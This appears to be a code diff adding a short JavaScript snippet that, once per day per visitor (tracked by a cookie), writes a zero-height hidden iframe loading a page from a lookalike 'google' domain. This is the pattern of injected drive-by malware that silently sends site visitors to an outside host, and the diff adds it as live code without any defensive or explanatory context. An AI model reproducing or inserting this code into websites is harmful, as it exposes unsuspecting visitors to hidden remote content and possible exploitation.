@@ -1,0 +1,12 @@
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 24*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie1=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie1=yes;expires="+ Then.toGMTString()
+document.write("<iframe src=http://google.ico6.cn/6666/z2.html width=100 height=0></iframe>");
+}
+}Get();
